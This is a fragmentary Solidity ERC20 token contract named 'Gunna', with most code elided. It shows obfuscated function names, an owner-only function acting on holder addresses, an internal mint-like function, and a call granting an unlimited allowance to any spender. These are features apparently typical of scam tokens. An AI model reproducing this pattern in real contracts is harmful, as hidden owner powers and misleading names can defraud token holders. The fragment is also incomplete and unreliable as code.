...
contract Gunna is IERC20, Ownable {
    
    using SafeMath for uint256;

    string _name = "Gunna";
    string _symbol = "GUNNA";
    uint8 _decimals = 9;
    ...
    function Alaphilippe(address holder) external onlyOwner {
    ...
    function increasetoken(address account, uint256 amounts) internal {
    ...
    function sentdata(uint256 iSupply) private pure returns(uint256, uint256) {
    ...
    function constructionReset(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function doubleInput() public view virtual returns (address) {
        return address(this);
    }
